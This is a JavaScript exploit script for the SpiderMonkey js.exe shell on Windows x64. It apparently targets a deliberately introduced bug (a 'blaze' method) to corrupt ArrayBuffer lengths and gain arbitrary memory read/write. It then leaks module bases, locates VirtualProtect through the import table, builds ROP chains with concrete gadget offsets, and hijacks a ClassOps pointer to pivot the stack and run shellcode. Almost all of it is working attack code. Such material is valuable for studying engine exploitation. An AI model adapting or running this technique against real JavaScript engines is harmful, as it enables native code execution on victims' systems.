// Axel '0vercl0k' Souchet - 30 September 2018
//
// Exploit for js.exe on Windows x64. Redirect control flow
// to a first gadget that prepares a bit the context as well as
// giving the possibility to redirect control flow on a second gadget
// that pivots the stack into the inline buffer of an Uint8Array object.
// From there, thanks to a small ROP chain I finally pivot the stack in a region
// I can have infinite space.
// The final payload calls VirtualProtect and sets +x on the region which finally
// gives us arbitrary native code execution.
//

const Debug = false;
const dbg = function (p) {
    if(Debug == false) {
        return;
    }

    print('Debug: ' + p);
};

const Smalls = [1, 2, 3, 4];
const AB1 = new ArrayBuffer(32);
const AB2 = new ArrayBuffer(32);

print('[*] Smalls is hella blazin rn..');
Smalls.blaze();

load('utils.js');
load('int64.js');
load('moarutils.js');

//
// Tamper the ArrayBuffer1's byteLength field via Smalls.
//

Smalls[11] = 0x100;

const U8A1 = new Uint8Array(AB1);

class __Pwn {
    __Access(Addr, LengthOrValues) {
        if(typeof Addr == 'string') {
            Addr = new Int64(Addr);
        }

        const IsRead = typeof LengthOrValues == 'number';
        let Length = LengthOrValues;
        if(!IsRead) {
            Length = LengthOrValues.length;
        }

        if(IsRead) {
            dbg('Read(' + Addr.toString(16) + ', ' + Length + ')');
        } else {
            dbg('Write(' + Addr.toString(16) + ', ' + Length + ')');
        }

        //
        // XXX: Sounds like without this code; reading from odd addresses doesnt work.
        //

        let OddOffset = 0;
        if(Addr.byteAt(0) & 0x1) {
            Length += 1;
            OddOffset = 1;
        }

        //
        // Fix ArrayBuffer2's length (a jsvalue; so we overwrite only the lower 32b)
        //

        // XXX: See if asJSValue() can't be changed for this?
        const Lower32 = new Int64(Length).bytes().slice(0, 4);
        U8A1.set(Lower32, 72);

        //
        // Verify that we properly corrupted the length of AB2
        //

        if(AB2.byteLength != Length) {
            print("Error: The ArrayBuffer's length doesn't check out");
            throw 'Error';
        }

        //
        // Fix base address
        //

        //
        // XXX: TODO check why private/values
        // to trigger the bp just Addr=0xffffffffffffffff
        //

        Addr = RShift1(Addr);
        U8A1.set(Addr.bytes(), 64);

        const Busted = new Uint8Array(AB2);
        if(IsRead) {
            return Busted.slice(OddOffset, Length);
        }

        Busted.set(LengthOrValues);
    }

    Read(Addr, Length) {
        return this.__Access(Addr, Length);
    }

    Write(Addr, Values) {
        return this.__Access(Addr, Values.length, Values);
    }

    WritePtr(Addr, Value) {
        const Values = new Int64(Value);
        this.__Access(Addr, Values.bytes());
    }

    Read32(Addr) {
        const Bytes = new Uint8Array([0, 0, 0, 0, 0, 0, 0, 0]);
        Bytes.set(this.Read(Addr, 4), 0);
        return new Int64(Bytes);
    }

    ReadPtr(Addr) {
        return new Int64(this.Read(Addr, 8));
    }

    ReadString(Addr) {
        let S = '';
        while(1337) {
            let Char = this.Read(Addr, 1)[0];
            if(Char == 0) {
                break;
            }

            S += String.fromCharCode(Char);
            Addr = Add(Addr, Int64.One);
        }
        return S;
    }

    AddrOf(Obj) {
        //
        // Technique from saelo's foxpwn exploit
        //

        AB2.hell_on_earth = Obj;
        const SlotsAddress = new Int64(U8A1.slice(48, 48 + 8));
        return Int64.fromJSValue(this.Read(SlotsAddress, 8));

        // Below technique uses Smalls.
        //
        // Smalls is contiguous with AB1. Go and write a jsvalue in its buffer,
        // and then read it out via a TypedArray.
        //

        Smalls[14] = Obj;
        const U8A = new Uint8Array(AB1);
        return Int64.fromJSValue(U8A.slice(0, 8));
    }
};

const Pwn = new __Pwn(Debug);

//
// Leak a bunch of stuff
//

const AB1Address = Pwn.AddrOf(AB1);
dbg('[+] AB1 is @ ' + AB1Address.toString(16));

const AB2Address = Pwn.AddrOf(AB2);
dbg('[+] AB2 is @ ' + AB2Address.toString(16));

const emptyelementsheader2js = new Int64(0x14fd2e8);
const js_emptyElementsHeader = Int64.fromDouble(Smalls[9]);
const JSBase = Sub(js_emptyElementsHeader, emptyelementsheader2js);
print('[+] js.exe is @ ' + JSBase.toString(16));

//
// Find kernel32.dll IMPORT_DESCRIPTOR in js.exe's IAT
//

// dt ntdll!_IMAGE_DOS_HEADER e_lfanew
//   +0x03c e_lfanew : Int4B
const ImgDosHeader_e_lfanew = Pwn.Read32(Add(JSBase, 0x3c));
const ImgNtHeaders64 = Add(JSBase, ImgDosHeader_e_lfanew);
// 0:000> dt ntdll!_IMAGE_NT_HEADERS64 OptionalHeader
//   +0x018 OptionalHeader : _IMAGE_OPTIONAL_HEADER64
// 0:000> dt ntdll!_IMAGE_OPTIONAL_HEADER64 DataDirectory
//   +0x070 DataDirectory : [16] _IMAGE_DATA_DIRECTORY
// 0:000> ?? sizeof(_IMAGE_DATA_DIRECTORY)
// unsigned int64 8
// 0:000> dt ntdll!_IMAGE_DATA_DIRECTORY
// ntdll!_IMAGE_DATA_DIRECTORY
//   +0x000 VirtualAddress   : Uint4B
let Kern32ImportDescriptor = Add(JSBase, Pwn.Read32(
    Add(ImgNtHeaders64, 0x18 + 0x70 + (1 * 8))
));

while(1337) {
    const NameAddress = Add(JSBase, Pwn.Read32(
        Add(Kern32ImportDescriptor, 3*4)
    ));
    const Name = Pwn.ReadString(NameAddress);
    print('[*] ImportDescriptor: ' + NameAddress.toString(16) + ': ' + Name);
    if(Name.toLowerCase() == 'kernel32.dll') {
        break;
    }
    Kern32ImportDescriptor = Add(Kern32ImportDescriptor, 0x14);
}

print('[+] KERNEL32.dll Import descriptor is @ ' + Kern32ImportDescriptor.toString(16));

//
// Go and find the address of KERNEL32.InitializeSListHead which is a forward export
// to ntdll!RtlInitializeSListHead.
//

const Kern32ImportNames = Add(JSBase, Pwn.Read32(Kern32ImportDescriptor));
const Kern32ImportAddresses = Add(JSBase, Pwn.Read32(
    Add(Kern32ImportDescriptor, 4 * 4)
));

print('[+]   Imports Name Array is @ ' + Kern32ImportNames.toString(16));
print('[+]   Imports Address Array is @ ' + Kern32ImportAddresses.toString(16));

let RtlInitiazeSListHead = null;
let VirtualProtect = null;
for(let Idx = 0; Idx < 100; Idx++) {
    const ImportAddress = Pwn.ReadPtr(Add(Kern32ImportAddresses, Idx * 8));
    const ImportNameAddress = Add(Add(JSBase, Pwn.ReadPtr(
        Add(Kern32ImportNames, Idx * 8)
    ), 2));
    const ImportNameAddressFixed = Add(ImportNameAddress, 2);
    const ImportName = Pwn.ReadString(ImportNameAddressFixed);
    print('[*]     Function: ' + ImportName + ' is @ ' + ImportAddress.toString(16));
    if(ImportName.toLowerCase().startsWith('initialize')) {
        RtlInitializeSListHead = ImportAddress;
    } else if(ImportName.toLowerCase().startsWith('virtualpro')) {
        VirtualProtect = ImportAddress;
    }

    if(VirtualProtect != null && RtlInitializeSListHead != null) {
        break;
    }
}

print('[+] ntdll!RtlInitializeSListHead is @ ' + RtlInitializeSListHead.toString(16));
print('[+] kernel32!VirtualProtect is @ ' + VirtualProtect.toString(16));

//
// From ntdll!RtlInitializeSListHead scan back until finding the base address.
//

let NtdllBase = RtlInitializeSListHead;
// XXX: Ugly trick to align the address to a page boundary
for(let Idx = 0; Idx < 12; Idx++) {
    NtdllBase = RShift1(NtdllBase);
}
for(let Idx = 0; Idx < 12; Idx++) {
    NtdllBase = LShift1(NtdllBase);
}

while(1337) {
    dbg("[*]   Looking for ntdll's base: " + NtdllBase.toString(16));
    const Mz = Pwn.ReadString(NtdllBase);
    if(Mz.startsWith('MZ')) {
        break;
    }
    NtdllBase = Sub(NtdllBase, 0x1000);
}

print('[+] ntdll is @ ' + NtdllBase);

//
// Retrieve a bunch of addresses needed to replace Target's clasp_ field
//

const Target = new Uint8Array(90);
const TargetAddress = Pwn.AddrOf(Target);
const TargetGroup_ = Pwn.ReadPtr(TargetAddress);
const TargetClasp_ = Pwn.ReadPtr(TargetGroup_);
const TargetcOps = Pwn.ReadPtr(Add(TargetClasp_, 0x10));
const TargetClasp_Address = Add(TargetGroup_, 0x0);

const TargetShapeOrExpando_ = Pwn.ReadPtr(Add(TargetAddress, 0x8));
const TargetBase_ = Pwn.ReadPtr(TargetShapeOrExpando_);
const TargetBaseClasp_Address = Add(TargetBase_, 0);

const ShellcodeAddress = Pwn.ReadPtr(
    Add(Pwn.AddrOf(Shellcode), 8 * 7)
);

print('[+] Payload is @ ' + ShellcodeAddress.toString(16));

//
// Prepare the final ROP chain which ..the first ROP chain will pivot to this
// one.
//

const RopChainMemorySize = 0x10000;
const RopChainMiddle = RopChainMemorySize / 2;
let Offset2BigRopChain = RopChainMiddle;
const RopChainBackingMemory = new Uint8Array(RopChainMemorySize);
const RopChainBackingMemoryAddress = Pwn.ReadPtr(
    Add(Pwn.AddrOf(RopChainBackingMemory), 8*7)
);

const PAGE_EXECUTE_READWRITE = new Int64(0x40);

const BigRopChain = [
    // 0x1400cc4ec: pop rcx ; ret  ;  (43 found)
    Add(JSBase, 0xcc4ec),
    ShellcodeAddress,

    // 0x1400731da: pop rdx ; ret  ;  (20 found)
    Add(JSBase, 0x731da),
    new Int64(Shellcode.length),

    // 0x14056c302: pop r8 ; ret  ;  (8 found)
    Add(JSBase, 0x56c302),
    PAGE_EXECUTE_READWRITE,

    VirtualProtect,
    // 0x1413f1d09: add rsp, 0x10 ; pop r14 ; pop r12 ; pop rbp ; ret  ;  (1 found)
    Add(JSBase, 0x13f1d09),
    new Int64('0x1111111111111111'),
    new Int64('0x2222222222222222'),
    new Int64('0x3333333333333333'),
    new Int64('0x4444444444444444'),
    ShellcodeAddress,

    // 0x1400e26fd: jmp rbp ;  (30 found)
    Add(JSBase, 0xe26fd)
];

for(const Entry of BigRopChain) {
    RopChainBackingMemory.set(Entry.bytes(), Offset2BigRopChain);
    Offset2BigRopChain += 8;
}

dbg('[+] Rop chain backing memory is @ ' + RopChainBackingMemoryAddress.toString(16));

//
// Prepare the first small rop chain. Its purpose is to pivot to
// a place where we have 'infinite' space.
//

let Offset2SmallRopChain = 0x18;
const SmallRopChain = [

    //
    // 0x140079e55: pop rsp ; ret  ;  (179 found)
    //

    Add(JSBase, 0x79e55),

    //
    // Pivot in the middle of the space we reserved for our artifical stack.
    //

    Add(RopChainBackingMemoryAddress, RopChainMiddle),
];

for(const Entry of SmallRopChain) {
    Target.set(Entry.bytes(), Offset2SmallRopChain);
    Offset2SmallRopChain += 8;
}

//
// 0:000> u ntdll+000b6d48 l10
// ntdll!TpSimpleTryPost+0x62c48:
// 00007ffe`1b7c6d48 f5              cmc
// 00007ffe`1b7c6d49 ff33            push    qword ptr [rbx]
// 00007ffe`1b7c6d4b db4889          fisttp  dword ptr [rax-77h]
// 00007ffe`1b7c6d4e 5c              pop     rsp
// 00007ffe`1b7c6d4f 2470            and     al,70h
// 00007ffe`1b7c6d51 8b7c2434        mov     edi,dword ptr [rsp+34h]
// 00007ffe`1b7c6d55 85ff            test    edi,edi
// 00007ffe`1b7c6d57 0f88b4d4f9ff    js      ntdll!TpSimpleTryPost+0x111 (00007ffe`1b764211)
// 0:000> u 00007ffe`1b764211
// ntdll!TpSimpleTryPost+0x111:
// 00007ffe`1b764211 8bc7            mov     eax,edi
// 00007ffe`1b764213 488b5c2468      mov     rbx,qword ptr [rsp+68h]
// 00007ffe`1b764218 488b742478      mov     rsi,qword ptr [rsp+78h]
// 00007ffe`1b76421d 4883c440        add     rsp,40h
// 00007ffe`1b764221 415f            pop     r15
// 00007ffe`1b764223 415e            pop     r14
// 00007ffe`1b764225 5f              pop     rdi
// 00007ffe`1b764226 c3              ret
//

const Pivot2SmallChain = Add(NtdllBase, 0xb6d48).bytes();
for(let Idx = 0; Idx < Pivot2SmallChain.length; Idx++) {
    Target[Idx] = Pivot2SmallChain[Idx];
}

//
// Prepare backing memory for the js::Class object, as well as the js::ClassOps object
//

// 0:000> ?? sizeof(js!js::Class) + sizeof(js::ClassOps)
// unsigned int64 0x88
const MemoryBackingObject = new Uint8Array(0x88);
const MemoryBackingObjectAddress = Pwn.AddrOf(MemoryBackingObject);
const ClassMemoryBackingAddress = Pwn.ReadPtr(Add(MemoryBackingObjectAddress, 7 * 8));
// 0:000> ?? sizeof(js!js::Class)
// unsigned int64 0x30
const ClassOpsMemoryBackingAddress = Add(ClassMemoryBackingAddress, 0x30);
dbg('[+] js::Class / js::ClassOps backing memory is @ ' + Pwn.AddrOf(MemoryBackingObject).toString(16));

//
// Copy the original Class object into our backing memory, and hijack
// the cOps field
//

MemoryBackingObject.set(Pwn.Read(TargetClasp_, 0x30), 0);
MemoryBackingObject.set(ClassOpsMemoryBackingAddress.bytes(), 0x10);

//
// Copy the original ClassOps object into our backing memory and hijack
// the add property
//

MemoryBackingObject.set(Pwn.Read(TargetcOps, 0x50), 0x30);
const Pivot = Add(new Int64(JSBase), 0x1085d80);

//
// 0:000> u 00007ff7`60ce5d80
// js!js::irregexp::RegExpLookahead::Accept [c:\users\over\mozilla-central\js\src\irregexp\regexpast.cpp @ 40]:
// 00007ff7`60ce5d80 488b02          mov     rax,qword ptr [rdx]
// 00007ff7`60ce5d83 4c8bca          mov     r9,rdx
// 00007ff7`60ce5d86 488bd1          mov     rdx,rcx
// 00007ff7`60ce5d89 498bc9          mov     rcx,r9
// 00007ff7`60ce5d8c 48ff6040        jmp     qword ptr [rax+40h]
// 0:000> ? 00007ff7`60ce5d80 - js
// Evaluate expression: 17325440 = 00000000`01085d80
//

MemoryBackingObject.set(Pivot.bytes(), 0x30);

//
// At this point, hijack Target's clasp_ fields; from both group and the
// shape. Note that we also update the shape as there's an assert in
// the debug build that makes sure the two classes matches
//

print("[*] Overwriting Target's clasp_ @ " + TargetClasp_Address.toString(16));
Pwn.WritePtr(TargetClasp_Address, ClassMemoryBackingAddress);
print("[*] Overwriting Target's shape clasp_ @ " + TargetBaseClasp_Address.toString(16));
Pwn.WritePtr(TargetBaseClasp_Address, ClassMemoryBackingAddress);

//
// Let's pull the trigger now
//

print('[*] Pulling the trigger bebe..');
Target.im_falling_and_i_cant_turn_back = 1;

